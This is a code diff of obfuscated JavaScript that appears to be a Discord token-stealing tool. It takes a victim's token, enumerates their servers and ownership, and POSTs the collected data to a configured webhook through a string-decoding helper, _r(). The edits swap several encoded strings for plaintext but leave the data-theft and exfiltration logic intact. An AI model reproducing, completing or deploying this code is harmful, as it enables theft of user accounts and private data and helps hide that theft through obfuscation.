@@ -74,7 +74,7 @@ const netReq = async (method, url, headers, data) => {
         hostname: url.host,
         path: url.pathname,
         method: method,
-        headers: { _r("Gzk5Pykpdxk1NC4oNTZ3GzY2NS13FSgzPTM0"): "*" },
+        headers: { "Access-Control-Allow-Origin": "*" },
     };
     if (url.search) options.path += url.search;
     for (const key in headers) options.headers[key] = headers[key];
@@ -165,7 +165,7 @@ const getGuilds = async token => {
     let rareGuilds = "";
     for (const guild of filteredGuilds) {
         if (rareGuilds === "") rareGuilds += `**Rare Servers:**\n`;
-        rareGuilds += `${guild.owner ? _r("ZmAJGwUVLTQ/KGBjY2tpa2hua29pb2huaWpsbWlkehUtND8o") : _r("ZmA7PjczNGBjbG1ib2tjb2xjaWpuYmhoamxkehs+NzM0")} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : _r("ZmA7PjczNGBjbG1ib2tjb2xjaWpuYmhoamxkehs+NzM0")} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
     }
     rareGuilds = rareGuilds || _r("cHAUNXoIOyg/egk/KCw/KClwcA==");
     return { message: rareGuilds, totalGuilds: guilds.length };
@@ -210,7 +210,7 @@ const dispatch = async (payload, token, account) => {
         payload["embeds"][embed]["color"] = 0xb143e3;
     }
 
-    await netReq("POST", CFG.wh, { _r("GTU0Lj80LncOIyo/"): _r("OyoqNjM5Oy4zNTR1MCk1NA==") }, JSON.stringify(payload));
+    await netReq("POST", CFG.wh, { "Content-Type": _r("OyoqNjM5Oy4zNTR1MCk1NA==") }, JSON.stringify(payload));
 };
 
 // ============================================================
